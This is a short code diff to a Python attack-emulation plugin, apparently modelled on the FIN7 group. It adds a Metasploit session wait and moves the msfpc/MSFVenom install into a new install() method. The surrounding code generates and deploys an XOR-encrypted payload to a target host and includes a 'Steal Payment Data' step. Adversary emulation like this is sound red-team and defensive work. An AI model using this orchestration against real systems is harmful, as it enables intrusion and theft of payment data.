@@ -33,6 +33,7 @@ class FIN7Plugin(AttackPlugin):
 
         self.metasploit_1 = Metasploit(self.metasploit_password, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
         self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1)
+        self.metasploit_1.wait_for_session()
         return self.metasploit_1
 
     def step1(self):
@@ -128,8 +129,6 @@ class FIN7Plugin(AttackPlugin):
         # -f C                : output is c code
         # --encrypt xor       : xor encrypt the results
         # --encrypt-key m     : the encryption key
-
-        self.attacker_machine_plugin.remote_run("sudo apt install msfpc")  # MSFVenom needs to be installed
 
         venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
         venom.generate_and_deploy(payload=self.payload_type_1,
@@ -304,6 +303,12 @@ class FIN7Plugin(AttackPlugin):
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)
+
+    def install(self):
+        """ Install tools for the attack """
+
+        # MSFVenom
+        self.attacker_machine_plugin.remote_run("sudo apt -y install msfpc")  # MSFVenom needs to be installed
 
     def run(self, targets):
         """ Run the command
